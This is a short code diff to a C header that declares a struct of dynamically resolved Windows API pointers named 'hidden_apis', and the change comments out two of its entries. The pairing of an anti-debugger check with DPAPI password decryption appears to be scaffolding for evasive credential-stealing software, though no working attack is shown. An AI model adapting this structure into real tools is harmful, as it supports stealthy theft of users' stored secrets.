@@ -22,18 +22,18 @@
 #define REFKNOWNFOLDERID const KNOWNFOLDERID * __MIDL_CONST
 
 typedef BOOL(WINAPI *PCheckRemoteDebuggerPresent)(HANDLE hProcess, PBOOL pbDebuggerPresent);
-typedef HMODULE(WINAPI *PLoadLibraryA)(LPCSTR lpLibFileName);
+// typedef HMODULE(WINAPI *PLoadLibraryA)(LPCSTR lpLibFileName);
 typedef BOOL(WINAPI *PCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, void*, void*, DWORD, DATA_BLOB*);
 typedef BOOL(WINAPI *PCryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
-typedef HRESULT(WINAPI *PSHGetKnownFolderPath)(REFKNOWNFOLDERID rfid, DWORD dwFlags, HANDLE hToken, PWSTR *ppszPath);
+// typedef HRESULT(WINAPI *PSHGetKnownFolderPath)(REFKNOWNFOLDERID rfid, DWORD dwFlags, HANDLE hToken, PWSTR *ppszPath);
 
 
 typedef struct {
   PCheckRemoteDebuggerPresent funcCheckRemoteDebuggerPresent;
-  PLoadLibraryA funcLoadLibraryA;
+  //PLoadLibraryA funcLoadLibraryA;
   PCryptUnprotectData funcCryptUnprotectData;
   PCryptStringToBinaryA funcCryptStringToBinaryA;
-  PSHGetKnownFolderPath funcSHGetKnownFolderPath;
+  //PSHGetKnownFolderPath funcSHGetKnownFolderPath;
 } hidden_apis;
 
 
